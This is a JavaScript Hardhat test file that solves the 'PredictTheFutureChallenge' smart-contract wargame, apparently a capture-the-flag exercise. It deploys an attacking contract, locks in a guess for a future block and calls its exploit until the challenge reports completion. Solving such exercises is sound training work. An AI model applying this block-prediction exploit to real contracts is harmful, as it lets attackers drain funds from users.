const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("PredictTheFutureChallenge", async function () {
  let contract;

  before(async function () {
    contract = await (
      await ethers.getContractFactory("PredictTheFutureChallenge")
    ).deploy({ value: ethers.utils.parseEther("1") });
  });

  it("Exploit", async function () {
    hackingContract = await (
      await ethers.getContractFactory("hackingPredictTheFutureChallenge")
    ).deploy(contract.address);

    const guess = (await ethers.provider.getBlockNumber()) + 2;
    await hackingContract.lockInGuess(await hackingContract.answer(guess), {
      value: ethers.utils.parseEther("1"),
    });
    await hackingContract.exploit();
  });

  after(async function () {
    expect(await contract.isComplete()).to.be.true;
  });
});
